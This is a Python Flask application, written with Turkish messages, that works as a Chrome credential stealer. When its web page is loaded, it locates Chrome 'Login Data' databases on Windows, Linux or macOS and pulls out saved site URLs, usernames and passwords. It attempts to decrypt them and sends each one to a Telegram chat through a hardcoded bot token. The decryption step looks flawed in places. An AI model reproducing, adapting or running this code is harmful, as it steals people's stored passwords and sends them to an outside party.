# app.py
from flask import Flask
import telebot
import os
import sqlite3
import shutil
import json
import base64
import time
import platform
import glob

app = Flask(__name__)
bot = telebot.TeleBot("8258388271:AAEr5lwYGZppBtSRy-c3wXCWu4Dr_GwASfI")
CHAT_ID = 7323434112

def get_paths():
    system = platform.system()
    base = os.path.expanduser("~")
    paths = []
    if system == "Windows":
        base_path = os.path.join(base, "AppData/Local/Google/Chrome/User Data")
        paths.extend(glob.glob(os.path.join(base_path, "*/Login Data")))
    elif system == "Linux":
        base_path = os.path.join(base, ".config/google-chrome")
        paths.extend(glob.glob(os.path.join(base_path, "*/Login Data")))
    elif system == "Darwin":  # Mac
        base_path = os.path.join(base, "Library/Application Support/Google/Chrome")
        paths.extend(glob.glob(os.path.join(base_path, "*/Login Data")))
    return paths or []

def get_master_key(local_state):
    try:
        with open(local_state, 'r', encoding='utf-8') as f:
            ls = json.load(f)
        enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
        return enc_key
    except Exception as e:
        return str(e)

def decrypt_aes(key, encrypted):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        iv = encrypted[3:15]
        ciphertext = encrypted[15:-16]  # Tag kaldır
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
        decryptor = cipher.decryptor()
        return (decryptor.update(ciphertext) + decryptor.finalize()).decode('utf-8', errors='ignore')
    except Exception as e:
        return f"[Decrypt hata: {e}]"

@app.route('/')
def home():
    bot.send_message(CHAT_ID, "REİS, CHROME ŞİFRELERİ ÇEKİLİYOR... 🔑")
    paths = get_paths()
    sifreler = []
    found = False

    if not paths:
        bot.send_message(CHAT_ID, "Hata: Chrome profili bulunamadı. Chrome kurulu mu?")
        return "Chrome yok reis."

    for db_path in paths:
        found = True
        local_state = db_path.replace("Login Data", "Local State")
        if not os.path.exists(local_state):
            bot.send_message(CHAT_ID, f"Hata: {db_path} için Local State yok.")
            continue
        try:
            key = get_master_key(local_state)
            if isinstance(key, str):  # Hata mesajıysa
                bot.send_message(CHAT_ID, f"Key hata: {key}")
                continue
            shutil.copy(db_path, "temp.db")
            conn = sqlite3.connect("temp.db")
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cur.fetchall()
            conn.close()
            os.remove("temp.db")
            for url, user, enc in rows:
                pwd = decrypt_aes(key, enc)
                sifreler.append(f"Site: {url}\nUser: {user}\nPass: {pwd}")
        except Exception as e:
            bot.send_message(CHAT_ID, f"Hata ({db_path}): {e}")

    if sifreler:
        for sifre in sifreler:
            bot.send_message(CHAT_ID, sifre)
            time.sleep(0.5)
        bot.send_message(CHAT_ID, f"✅ {len(sifreler)} ŞİFRE GÖNDERİLDİ! (25 olmalı)")
    else:
        bot.send_message(CHAT_ID, "Şifre bulunamadı! Chrome TAM kapalı mı? Task Manager’da kontrol et.")

    return "<h1>ŞİFRELER TELEGRAM'DA REİS!</h1><p>Chrome'u kapatıp tekrar dene.</p>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
